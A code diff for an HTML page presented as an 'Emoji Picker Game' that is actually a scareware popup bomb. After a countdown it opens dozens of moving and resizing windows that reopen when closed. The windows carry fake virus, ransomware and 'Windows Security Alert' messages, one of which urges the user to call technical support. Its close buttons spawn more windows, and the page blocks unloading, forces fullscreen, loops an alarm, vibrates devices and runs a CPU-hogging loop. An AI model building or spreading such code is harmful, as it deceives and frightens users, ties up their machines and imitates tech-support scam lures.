@@ -1,19 +1,33 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>BS unblocked</title>
+  <meta charset="UTF-8" />
+  <title>SUPER UNBLOCKED</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       background-color: #1e1e2f;
       color: #fff;
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
       font-family: 'Arial', sans-serif;
+      overflow: hidden;
+    }
+
+    .container {
+      text-align: center;
+      z-index: 10;
+    }
+
+    h1 {
+      font-size: 3rem;
+      margin-bottom: 2rem;
+      text-shadow: 0 0 10px #ff416c;
+      animation: textFlash 0.5s infinite alternate;
     }
 
     button {
@@ -28,11 +42,36 @@
       cursor: pointer;
       transition: transform 0.3s ease, box-shadow 0.3s ease;
       animation: pulse 2s infinite;
+      position: relative;
+      overflow: hidden;
     }
 
     button:hover {
       transform: scale(1.1);
       box-shadow: 0 0 30px rgba(255, 75, 43, 0.9);
+    }
+
+    button::before {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+      transform: rotate(45deg);
+      animation: shine 3s infinite;
+    }
+
+    @keyframes shine {
+      0% {
+        left: -50%;
+        top: -50%;
+      }
+      100% {
+        left: 100%;
+        top: 100%;
+      }
     }
 
     @keyframes pulse {
@@ -46,78 +85,959 @@
         box-shadow: 0 0 20px rgba(255, 65, 108, 0.7);
       }
     }
+
+    @keyframes textFlash {
+      0% {
+        color: #fff;
+        text-shadow: 0 0 10px #ff416c;
+      }
+      100% {
+        color: #ff416c;
+        text-shadow: 0 0 20px #fff;
+      }
+    }
+
+    .background-effects {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    .floating-emoji {
+      position: absolute;
+      font-size: 2rem;
+      animation: float 10s linear infinite;
+      opacity: 0.7;
+    }
+
+    @keyframes float {
+      0% {
+        transform: translate(0, 0) rotate(0deg);
+      }
+      100% {
+        transform: translate(calc(100vw - 50px), calc(100vh - 50px)) rotate(360deg);
+      }
+    }
+
+    .warning-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background: linear-gradient(90deg, #ff0000, #ff8800);
+      color: white;
+      padding: 10px;
+      font-weight: bold;
+      text-align: center;
+      animation: warningFlash 0.5s infinite alternate;
+      z-index: 100;
+    }
+
+    @keyframes warningFlash {
+      0% {
+        background: linear-gradient(90deg, #ff0000, #ff8800);
+      }
+      100% {
+        background: linear-gradient(90deg, #ff8800, #ff0000);
+      }
+    }
+
+    .fake-close-button {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: red;
+      color: white;
+      border: none;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      font-weight: bold;
+      cursor: pointer;
+      z-index: 1000;
+    }
+
+    #countdown {
+      font-size: 1.5rem;
+      margin-top: 1rem;
+      color: #ff416c;
+    }
+
+    .disclaimer {
+      position: fixed;
+      bottom: 50px;
+      font-size: 0.8rem;
+      color: #666;
+      text-align: center;
+      padding: 0 20px;
+    }
   </style>
 </head>
 <body>
-  <button onclick="startOpeningPopups()">Start Game</button>
+  <div class="container">
+    <h1>EMOJI PICKER GAME</h1>
+    <button id="startButton" onclick="startTheNightmare()">START GAME</button>
+    <div id="countdown"></div>
+  </div>
+
+  <div class="background-effects" id="backgroundEffects"></div>
+  
+  <div class="warning-bar" id="warningBar" style="display: none;">
+    WARNING: SYSTEM INSTABILITY DETECTED - CLOSE ALL WINDOWS IMMEDIATELY
+  </div>
+
+  <button class="fake-close-button" onclick="spawnMorePopups(5)">X</button>
+
+
+  <audio id="alarmSound" loop>
+    <source src="data:audio/mp3;base64,SUQzBAAAAAAAI1RTU0UAAAAPAAADTGF2ZjU4Ljc2LjEwMAAAAAAAAAAAAAAA//tQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWGluZwAAAA8AAAACAAADwAD///////////////////////////////////////////8AAAA8TEFNRTMuMTAwAQAAAAAAAAAAABSAJAJAQgAAgAAAA8DWZLgSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//sQZAAP8AAAaQAAAAgAAA0gAAABAAABpAAAACAAADSAAAAETEFNRTMuMTAwVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV" type="audio/mp3">
+  </audio>
+  <audio id="errorSound">
+    <source src="data:audio/mp3;base64,SUQzBAAAAAAAI1RTU0UAAAAPAAADTGF2ZjU4Ljc2LjEwMAAAAAAAAAAAAAAA//tQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWGluZwAAAA8AAAACAAADwAD///////////////////////////////////////////8AAAA8TEFNRTMuMTAwAQAAAAAAAAAAABSAJAJAQgAAgAAAA8DWZLgSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//sQZAAP8AAAaQAAAAgAAA0gAAABAAABpAAAACAAADSAAAAETEFNRTMuMTAwVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV" type="audio/mp3">
+  </audio>
 
   <script>
-    let popupInterval;
+    // Array of annoying messages
+    const annoyingMessages = [
+      "YOUR COMPUTER IS NOW INFECTED",
+      "SYSTEM32 CORRUPTED",
+      "DOWNLOADING VIRUS.EXE... 78% COMPLETE",
+      "ALL YOUR FILES ARE ENCRYPTED",
+      "SENDING YOUR BROWSING HISTORY TO ALL CONTACTS",
+      "WEBCAM ACTIVATED",
+      "MICROPHONE RECORDING STARTED",
+      "BANK DETAILS COMPROMISED",
+      "FORMATTING C: DRIVE",
+      "INSTALLING RANSOMWARE",
+      "BITCOIN MINER ACTIVATED",
+      "UPLOADING PERSONAL FILES",
+      "DELETING SYSTEM RESTORE POINTS",
+      "OVERCLOCKING CPU TO DANGEROUS LEVELS",
+      "DISABLING FIREWALL",
+      "BYPASSING ANTIVIRUS",
+      "CONNECTING TO BOTNET",
+      "INITIATING DDOS ATTACK FROM YOUR IP",
+      "COOKIES STOLEN",
+      "PASSWORDS COMPROMISED"
+    ];
 
-    function startOpeningPopups() {
-      popupInterval = setInterval(() => {
-        const width = 200;
-        const height = 100;
-        const x = Math.floor(Math.random() * (screen.availWidth - width));
-        const y = Math.floor(Math.random() * (screen.availHeight - height));
+    // Array of emojis for floating background
+    const emojis = [
+      "💀", "⚠️", "🔥", "💣", "⛔", "🚫", "🔒", 
+      "🔓", "🔴", "🔺", "❌", "💥", "🧨", "👹", "💩"
+    ];
 
-        const popup = window.open(
-          "",
-          "_blank",
-          `width=${width},height=${height},left=${x},top=${y}`
-        );
+    // Create floating emojis in the background
+    function createFloatingEmojis(count) {
+      const container = document.getElementById('backgroundEffects');
+      container.innerHTML = '';
+      
+      for (let i = 0; i < count; i++) {
+        const emoji = document.createElement('div');
+        emoji.className = 'floating-emoji';
+        emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+        emoji.style.left = `${Math.random() * 100}vw`;
+        emoji.style.top = `${Math.random() * 100}vh`;
+        emoji.style.animationDuration = `${5 + Math.random() * 15}s`;
+        emoji.style.animationDelay = `${Math.random() * 5}s`;
+        container.appendChild(emoji);
+      }
+    }
 
-        if (popup) {
-          popup.document.write(`
-            <html>
-              <head>
-                <title>Moving Popup</title>
-                <style>
-                  body {
-                    background-color: #f0f0f0;
-                    font-family: sans-serif;
-                    margin: 0;
-                    display: flex;
-                    justify-content: center;
-                    align-items: center;
-                    height: 100vh;
-                    text-align: center;
-                  }
-                </style>
-              </head>
-              <body>
-                <h3>blud got virused</h3>
-                <script>
-                  let dx = (Math.random() * 4 + 1) * (Math.random() < 0.5 ? -1 : 1);
-                  let dy = (Math.random() * 4 + 1) * (Math.random() < 0.5 ? -1 : 1);
+    // Initialize with some floating emojis
+    createFloatingEmojis(20);
 
-                  function movePopup() {
-                    let x = window.screenX + dx;
-                    let y = window.screenY + dy;
+    // Variables to track state
+    let popupCount = 0;
+    let maxPopups = 50;
+    let popupIntervals = [];
+    let allPopups = [];
+    let isNightmareActive = false;
+    let countdownInterval;
+    let cpuHogInterval;
 
-                    if (x <= 0 || x >= screen.availWidth - window.outerWidth) dx = -dx;
-                    if (y <= 0 || y >= screen.availHeight - window.outerHeight) dy = -dy;
-
-                    window.moveTo(x, y);
-                    setTimeout(movePopup, 30);
-                  }
-
-                  movePopup();
-                <\/script>
-              </body>
-            </html>
-          `);
+    // Function to start the nightmare
+    function startTheNightmare() {
+      if (isNightmareActive) return;
+      isNightmareActive = true;
+      
+      // Hide the start button and show countdown
+      document.getElementById('startButton').style.display = 'none';
+      const countdownElement = document.getElementById('countdown');
+      let count = 3;
+      
+      countdownInterval = setInterval(() => {
+        if (count > 0) {
+          countdownElement.textContent = `Starting in ${count}...`;
+          count--;
         } else {
-          alert("Pop-up blocked! Please enable pop-ups for this site.");
-          clearInterval(popupInterval);
+          clearInterval(countdownInterval);
+          countdownElement.textContent = "GOOD LUCK CLOSING EVERYTHING!";
+          
+          // Show warning bar
+          document.getElementById('warningBar').style.display = 'block';
+          
+          // Start the madness
+          startPopupMadness();
+          startBackgroundEffects();
+          startAudioEffects();
+          startCPUHog();
+          
+          // Request fullscreen
+          requestFullscreen();
+          
+          // Vibrate on mobile devices
+          if (navigator.vibrate) {
+            setInterval(() => {
+              navigator.vibrate([200, 100, 200]);
+            }, 2000);
+          }
+          
+          // Prevent closing the page
+          window.addEventListener('beforeunload', preventClose);
         }
-      }, 1); // open new popup every 300ms
+      }, 1000);
+    }
+
+    // Function to start opening various types of popups
+    function startPopupMadness() {
+      // Start with a batch of initial popups
+      spawnMorePopups(5);
+      
+      // Create different types of popups at different intervals
+      popupIntervals.push(setInterval(() => spawnMovingPopup(), 2000));
+      popupIntervals.push(setInterval(() => spawnResizingPopup(), 3000));
+      popupIntervals.push(setInterval(() => spawnFakeAlertPopup(), 5000));
+      popupIntervals.push(setInterval(() => spawnFakeClosePopup(), 4000));
+      popupIntervals.push(setInterval(() => spawnMorePopups(1), 1000));
+      
+      // Periodically check if popups were closed and reopen them
+      setInterval(reopenClosedPopups, 1000);
+    }
+
+    // Function to spawn multiple popups
+    function spawnMorePopups(count) {
+      for (let i = 0; i < count; i++) {
+        if (popupCount < maxPopups) {
+          setTimeout(() => {
+            const popupType = Math.floor(Math.random() * 4);
+            switch (popupType) {
+              case 0: spawnMovingPopup(); break;
+              case 1: spawnResizingPopup(); break;
+              case 2: spawnFakeAlertPopup(); break;
+              case 3: spawnFakeClosePopup(); break;
+            }
+          }, i * 200);
+        }
+      }
+    }
+
+    // Function to spawn a moving popup
+    function spawnMovingPopup() {
+      if (popupCount >= maxPopups) return;
+      
+      const width = 300;
+      const height = 200;
+      const x = Math.floor(Math.random() * (screen.availWidth - width));
+      const y = Math.floor(Math.random() * (screen.availHeight - height));
+
+      const popup = window.open(
+        "",
+        `popup_${Date.now()}`,
+        `width=${width},height=${height},left=${x},top=${y}`
+      );
+
+      if (popup) {
+        popupCount++;
+        allPopups.push(popup);
+        
+        const message = annoyingMessages[Math.floor(Math.random() * annoyingMessages.length)];
+        
+        popup.document.write(`
+          <html>
+            <head>
+              <title>ALERT</title>
+              <style>
+                body {
+                  background-color: #ff0000;
+                  color: white;
+                  font-family: sans-serif;
+                  margin: 0;
+                  display: flex;
+                  flex-direction: column;
+                  justify-content: center;
+                  align-items: center;
+                  height: 100vh;
+                  text-align: center;
+                  overflow: hidden;
+                  animation: bgFlash 0.5s infinite alternate;
+                }
+                
+                h2 {
+                  margin: 0;
+                  padding: 10px;
+                  font-size: 1.5rem;
+                }
+                
+                .emoji {
+                  font-size: 3rem;
+                  margin-bottom: 10px;
+                }
+                
+                @keyframes bgFlash {
+                  0% { background-color: #ff0000; }
+                  100% { background-color: #ff6600; }
+                }
+                
+                .fake-button {
+                  padding: 10px 20px;
+                  background: #00ff00;
+                  color: black;
+                  border: none;
+                  border-radius: 5px;
+                  margin-top: 20px;
+                  cursor: pointer;
+                  font-weight: bold;
+                }
+              </style>
+            </head>
+            <body>
+              <div class="emoji">${emojis[Math.floor(Math.random() * emojis.length)]}</div>
+              <h2>${message}</h2>
+              <button class="fake-button" onclick="window.opener.spawnMorePopups(3)">CLOSE</button>
+              
+              <script>
+                // Make the window move around
+                let dx = (Math.random() * 8 + 2) * (Math.random() < 0.5 ? -1 : 1);
+                let dy = (Math.random() * 8 + 2) * (Math.random() < 0.5 ? -1 : 1);
+                
+                function movePopup() {
+                  let x = window.screenX + dx;
+                  let y = window.screenY + dy;
+                  
+                  // Bounce off screen edges
+                  if (x <= 0 || x >= screen.availWidth - window.outerWidth) dx = -dx;
+                  if (y <= 0 || y >= screen.availHeight - window.outerHeight) dy = -dy;
+                  
+                  window.moveTo(x, y);
+                  setTimeout(movePopup, 20);
+                }
+                
+                movePopup();
+                
+                // Try to prevent closing
+                window.addEventListener('beforeunload', function(e) {
+                  e.preventDefault();
+                  e.returnValue = '';
+                  window.opener.spawnMorePopups(2);
+                  return '';
+                });
+              <\/script>
+            </body>
+          </html>
+        `);
+      }
+    }
+
+    // Function to spawn a resizing popup
+    function spawnResizingPopup() {
+      if (popupCount >= maxPopups) return;
+      
+      const width = 200;
+      const height = 150;
+      const x = Math.floor(Math.random() * (screen.availWidth - width));
+      const y = Math.floor(Math.random() * (screen.availHeight - height));
+
+      const popup = window.open(
+        "",
+        `popup_${Date.now()}`,
+        `width=${width},height=${height},left=${x},top=${y}`
+      );
+
+      if (popup) {
+        popupCount++;
+        allPopups.push(popup);
+        
+        const message = annoyingMessages[Math.floor(Math.random() * annoyingMessages.length)];
+        
+        popup.document.write(`
+          <html>
+            <head>
+              <title>SYSTEM ERROR</title>
+              <style>
+                body {
+                  background-color: #000000;
+                  color: #00ff00;
+                  font-family: monospace;
+                  margin: 0;
+                  display: flex;
+                  flex-direction: column;
+                  justify-content: center;
+                  align-items: center;
+                  height: 100vh;
+                  text-align: center;
+                  overflow: hidden;
+                }
+                
+                h2 {
+                  margin: 0;
+                  padding: 10px;
+                  font-size: 1.2rem;
+                }
+                
+                .progress-bar {
+                  width: 80%;
+                  height: 20px;
+                  background-color: #333;
+                  margin-top: 20px;
+                  border-radius: 10px;
+                  overflow: hidden;
+                }
+                
+                .progress {
+                  height: 100%;
+                  background-color: #00ff00;
+                  width: 0%;
+                  animation: progress 10s linear infinite;
+                }
+                
+                @keyframes progress {
+                  0% { width: 0%; }
+                  100% { width: 100%; }
+                }
+              </style>
+            </head>
+            <body>
+              <h2>${message}</h2>
+              <div class="progress-bar">
+                <div class="progress"></div>
+              </div>
+              
+              <script>
+                // Make the window resize randomly
+                let growing = true;
+                let minWidth = 200;
+                let maxWidth = 600;
+                let minHeight = 150;
+                let maxHeight = 400;
+                let currentWidth = minWidth;
+                let currentHeight = minHeight;
+                
+                function resizePopup() {
+                  if (growing) {
+                    currentWidth += Math.random() * 10;
+                    currentHeight += Math.random() * 8;
+                    
+                    if (currentWidth >= maxWidth || currentHeight >= maxHeight) {
+                      growing = false;
+                    }
+                  } else {
+                    currentWidth -= Math.random() * 10;
+                    currentHeight -= Math.random() * 8;
+                    
+                    if (currentWidth <= minWidth || currentHeight <= minHeight) {
+                      growing = true;
+                    }
+                  }
+                  
+                  window.resizeTo(currentWidth, currentHeight);
+                  
+                  // Also move slightly
+                  let x = window.screenX + (Math.random() * 6 - 3);
+                  let y = window.screenY + (Math.random() * 6 - 3);
+                  window.moveTo(x, y);
+                  
+                  setTimeout(resizePopup, 100);
+                }
+                
+                resizePopup();
+                
+                // Try to prevent closing
+                window.addEventListener('beforeunload', function(e) {
+                  e.preventDefault();
+                  e.returnValue = '';
+                  window.opener.spawnMorePopups(2);
+                  return '';
+                });
+              <\/script>
+            </body>
+          </html>
+        `);
+      }
+    }
+
+    // Function to spawn a fake alert popup
+    function spawnFakeAlertPopup() {
+      if (popupCount >= maxPopups) return;
+      
+      const width = 400;
+      const height = 200;
+      const x = Math.floor(Math.random() * (screen.availWidth - width));
+      const y = Math.floor(Math.random() * (screen.availHeight - height));
+
+      const popup = window.open(
+        "",
+        `popup_${Date.now()}`,
+        `width=${width},height=${height},left=${x},top=${y}`
+      );
+
+      if (popup) {
+        popupCount++;
+        allPopups.push(popup);
+        
+        const alertType = Math.floor(Math.random() * 3);
+        let title, message, style;
+        
+        switch (alertType) {
+          case 0: // Windows error
+            title = "Windows Security Alert";
+            message = "Critical system error detected. Your computer is at risk. Call technical support immediately.";
+            style = `
+              body { 
+                background-color: #0078d7; 
+                font-family: 'Segoe UI', sans-serif;
+              }
+              .alert-box {
+                background-color: #f0f0f0;
+                color: #000;
+                border-radius: 0;
+                box-shadow: 0 0 10px rgba(0,0,0,0.5);
+              }
+              .title-bar {
+                background-color: #0078d7;
+              }
+              .icon {
+                content: "⚠️";
+              }
+            `;
+            break;
+          case 1: // Mac error
+            title = "macOS Alert";
+            message = "Your system has encountered a problem that it cannot recover from. Contact Apple Support.";
+            style = `
+              body { 
+                background-color: #f0f0f0; 
+                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+              }
+              .alert-box {
+                background-color: #ffffff;
+                color: #000;
+                border-radius: 10px;
+                box-shadow: 0 0 20px rgba(0,0,0,0.2);
+              }
+              .title-bar {
+                background-color: #e0e0e0;
+              }
+              .icon {
+                content: "⚠️";
+              }
+            `;
+            break;
+          case 2: // Virus alert
+            title = "VIRUS DETECTED";
+            message = "MULTIPLE THREATS FOUND! Your system is heavily infected with spyware. Immediate action required!";
+            style = `
+              body { 
+                background-color: #ff0000; 
+                font-family: Impact, sans-serif;
+              }
+              .alert-box {
+                background-color: #000;
+                color: #ff0000;
+                border: 3px solid #ff0000;
+                border-radius: 0;
+                box-shadow: 0 0 20px rgba(255,0,0,0.7);
+                animation: flash 0.5s infinite alternate;
+              }
+              @keyframes flash {
+                0% { box-shadow: 0 0 20px rgba(255,0,0,0.7); }
+                100% { box-shadow: 0 0 30px rgba(255,255,0,0.9); }
+              }
+              .title-bar {
+                background-color: #aa0000;
+              }
+              .icon {
+                content: "🦠";
+              }
+            `;
+            break;
+        }
+        
+        popup.document.write(`
+          <html>
+            <head>
+              <title>${title}</title>
+              <style>
+                body {
+                  margin: 0;
+                  padding: 0;
+                  display: flex;
+                  justify-content: center;
+                  align-items: center;
+                  height: 100vh;
+                  overflow: hidden;
+                }
+                
+                .alert-box {
+                  width: 90%;
+                  max-width: 380px;
+                  border-radius: 5px;
+                  overflow: hidden;
+                }
+                
+                .title-bar {
+                  padding: 10px;
+                  color: white;
+                  font-weight: bold;
+                  display: flex;
+                  justify-content: space-between;
+                  align-items: center;
+                }
+                
+                .content {
+                  padding: 20px;
+                  display: flex;
+                  align-items: center;
+                }
+                
+                .icon {
+                  font-size: 2.5rem;
+                  margin-right: 15px;
+                }
+                
+                .message {
+                  flex: 1;
+                }
+                
+                .buttons {
+                  display: flex;
+                  justify-content: flex-end;
+                  padding: 10px;
+                  gap: 10px;
+                }
+                
+                button {
+                  padding: 8px 15px;
+                  border: none;
+                  border-radius: 3px;
+                  cursor: pointer;
+                }
+                
+                ${style}
+              </style>
+            </head>
+            <body>
+              <div class="alert-box">
+                <div class="title-bar">
+                  <span>${title}</span>
+                  <span style="cursor:pointer" onclick="window.opener.spawnMorePopups(3)">✕</span>
+                </div>
+                <div class="content">
+                  <div class="icon">⚠️</div>
+                  <div class="message">${message}</div>
+                </div>
+                <div class="buttons">
+                  <button onclick="window.opener.spawnMorePopups(2)">OK</button>
+                  <button onclick="window.opener.spawnMorePopups(5)">Cancel</button>
+                </div>
+              </div>
+              
+              <script>
+                // Move slightly to be annoying
+                let dx = (Math.random() * 2) * (Math.random() < 0.5 ? -1 : 1);
+                let dy = (Math.random() * 2) * (Math.random() < 0.5 ? -1 : 1);
+                
+                function movePopup() {
+                  let x = window.screenX + dx;
+                  let y = window.screenY + dy;
+                  
+                  if (x <= 0 || x >= screen.availWidth - window.outerWidth) dx = -dx;
+                  if (y <= 0 || y >= screen.availHeight - window.outerHeight) dy = -dy;
+                  
+                  window.moveTo(x, y);
+                  setTimeout(movePopup, 50);
+                }
+                
+                movePopup();
+                
+                // Try to prevent closing
+                window.addEventListener('beforeunload', function(e) {
+                  e.preventDefault();
+                  e.returnValue = '';
+                  window.opener.spawnMorePopups(2);
+                  return '';
+                });
+                
+                // Play error sound when opened
+                window.opener.playErrorSound();
+              <\/script>
+            </body>
+          </html>
+        `);
+      }
+    }
+
+    // Function to spawn a fake close popup
+    function spawnFakeClosePopup() {
+      if (popupCount >= maxPopups) return;
+      
+      const width = 350;
+      const height = 180;
+      const x = Math.floor(Math.random() * (screen.availWidth - width));
+      const y = Math.floor(Math.random() * (screen.availHeight - height));
+
+      const popup = window.open(
+        "",
+        `popup_${Date.now()}`,
+        `width=${width},height=${height},left=${x},top=${y}`
+      );
+
+      if (popup) {
+        popupCount++;
+        allPopups.push(popup);
+        
+        popup.document.write(`
+          <html>
+            <head>
+              <title>Close All Windows</title>
+              <style>
+                body {
+                  background-color: #f0f0f0;
+                  font-family: Arial, sans-serif;
+                  margin: 0;
+                  display: flex;
+                  flex-direction: column;
+                  justify-content: center;
+                  align-items: center;
+                  height: 100vh;
+                  text-align: center;
+                  padding: 20px;
+                }
+                
+                h2 {
+                  margin-top: 0;
+                  color: #333;
+                }
+                
+                .button-container {
+                  display: flex;
+                  flex-direction: column;
+                  gap: 10px;
+                  margin-top: 20px;
+                  width: 80%;
+                }
+                
+                .close-button {
+                  padding: 10px;
+                  background-color: #4CAF50;
+                  color: white;
+                  border: none;
+                  border-radius: 5px;
+                  cursor: pointer;
+                  font-weight: bold;
+                  transition: background-color 0.3s;
+                }
+                
+                .close-button:hover {
+                  background-color: #45a049;
+                }
+                
+                .trap-button {
+                  padding: 10px;
+                  background-color: #f44336;
+                  color: white;
+                  border: none;
+                  border-radius: 5px;
+                  cursor: pointer;
+                  font-weight: bold;
+                  transition: background-color 0.3s;
+                }
+                
+                .trap-button:hover {
+                  background-color: #d32f2f;
+                }
+              </style>
+            </head>
+            <body>
+              <h2>Close All Windows?</h2>
+              <div class="button-container">
+                <button class="trap-button" onclick="window.opener.spawnMorePopups(10)">Yes, Close Everything</button>
+                <button class="trap-button" onclick="window.opener.spawnMorePopups(5)">No, Keep Windows Open</button>
+                <button class="close-button" onclick="trapClick()">Close This Window Only</button>
+              </div>
+              
+              <script>
+                function trapClick() {
+                  // Move the button when clicked
+                  const buttons = document.querySelectorAll('button');
+                  buttons.forEach(button => {
+                    button.style.position = 'absolute';
+                    button.style.left = Math.random() * (window.innerWidth - 150) + 'px';
+                    button.style.top = Math.random() * (window.innerHeight - 50) + 'px';
+                  });
+                  
+                  // Spawn more popups
+                  window.opener.spawnMorePopups(3);
+                }
+                
+                // Try to prevent closing
+                window.addEventListener('beforeunload', function(e) {
+                  e.preventDefault();
+                  e.returnValue = '';
+                  window.opener.spawnMorePopups(2);
+                  return '';
+                });
+              <\/script>
+            </body>
+          </html>
+        `);
+      }
+    }
+
+    // Function to reopen closed popups
+    function reopenClosedPopups() {
+      if (!isNightmareActive) return;
+      
+      // Filter out closed popups
+      const closedPopups = allPopups.filter(popup => popup.closed);
+      allPopups = allPopups.filter(popup => !popup.closed);
+      
+      // Update popup count
+      popupCount -= closedPopups.length;
+      
+      // Spawn new popups to replace closed ones (with a limit)
+      if (closedPopups.length > 0 && popupCount < maxPopups) {
+        // Spawn half as many as were closed, but at least 1
+        const newCount = Math.max(1, Math.floor(closedPopups.length / 2));
+        spawnMorePopups(newCount);
+      }
+    }
+
+    // Function to start background effects
+    function startBackgroundEffects() {
+      // Add more floating emojis
+      createFloatingEmojis(50);
+      
+      // Flash the background
+      let flashCount = 0;
+      setInterval(() => {
+        if (flashCount % 20 === 0) { // Every 10 seconds, flash intensely
+          document.body.style.animation = 'none';
+          document.body.offsetHeight; // Trigger reflow
+          document.body.style.animation = 'textFlash 0.1s 10 alternate';
+          
+          setTimeout(() => {
+            document.body.style.animation = '';
+          }, 2000);
+        }
+        flashCount++;
+      }, 500);
+    }
+
+    // Function to start audio effects
+    function startAudioEffects() {
+      const alarmSound = document.getElementById('alarmSound');
+      alarmSound.volume = 0.3;
+      alarmSound.play().catch(e => console.log('Audio play prevented by browser policy'));
+      
+      // Periodically try to play the alarm (browsers might block autoplay)
+      setInterval(() => {
+        if (alarmSound.paused) {
+          alarmSound.play().catch(e => {});
+        }
+      }, 5000);
+    }
+
+    // Function to play error sound
+    function playErrorSound() {
+      const errorSound = document.getElementById('errorSound');
+      errorSound.volume = 0.5;
+      errorSound.currentTime = 0;
+      errorSound.play().catch(e => {});
+    }
+
+    // Function to request fullscreen
+    function requestFullscreen() {
+      const elem = document.documentElement;
+      if (elem.requestFullscreen) {
+        elem.requestFullscreen().catch(e => {});
+      } else if (elem.webkitRequestFullscreen) {
+        elem.webkitRequestFullscreen().catch(e => {});
+      } else if (elem.msRequestFullscreen) {
+        elem.msRequestFullscreen().catch(e => {});
+      }
+      
+      // Try again periodically
+      setInterval(() => {
+        if (!document.fullscreenElement) {
+          elem.requestFullscreen().catch(e => {});
+        }
+      }, 5000);
+    }
+
+    // Function to start CPU-intensive operations
+    function startCPUHog() {
+      cpuHogInterval = setInterval(() => {
+        // Create a computationally expensive operation
+        let result = 0;
+        for (let i = 0; i < 1000000; i++) {
+          result += Math.sqrt(i) * Math.sin(i);
+        }
+      }, 1000);
+    }
+
+    // Function to prevent closing the page
+    function preventClose(e) {
+      e.preventDefault();
+      e.returnValue = 'Are you sure you want to leave? Your computer might be at risk!';
+      
+      // Spawn more popups when trying to leave
+      spawnMorePopups(5);
+      
+      return e.returnValue;
+    }
+
+    // Clean up function (for development purposes)
+    function cleanUp() {
+      // Close all popups
+      allPopups.forEach(popup => {
+        if (!popup.closed) {
+          popup.close();
+        }
+      });
+      
+      // Clear all intervals
+      popupIntervals.forEach(interval => clearInterval(interval));
+      clearInterval(countdownInterval);
+      clearInterval(cpuHogInterval);
+      
+      // Stop audio
+      document.getElementById('alarmSound').pause();
+      
+      // Remove event listeners
+      window.removeEventListener('beforeunload', preventClose);
+      
+      // Reset state
+      popupCount = 0;
+      allPopups = [];
+      isNightmareActive = false;
+      
+      // Exit fullscreen
+      if (document.exitFullscreen) {
+        document.exitFullscreen().catch(e => {});
+      }
+      
+      // Reset UI
+      document.getElementById('startButton').style.display = 'block';
+      document.getElementById('countdown').textContent = '';
+      document.getElementById('warningBar').style.display = 'none';
+      
+      console.log('Cleanup complete');
     }
   </script>
 </body>
 </html>
-
-
-<script defer data-domain="html.cafe" src="https://milkymouse.com/js/script.js"></script>
-
-   
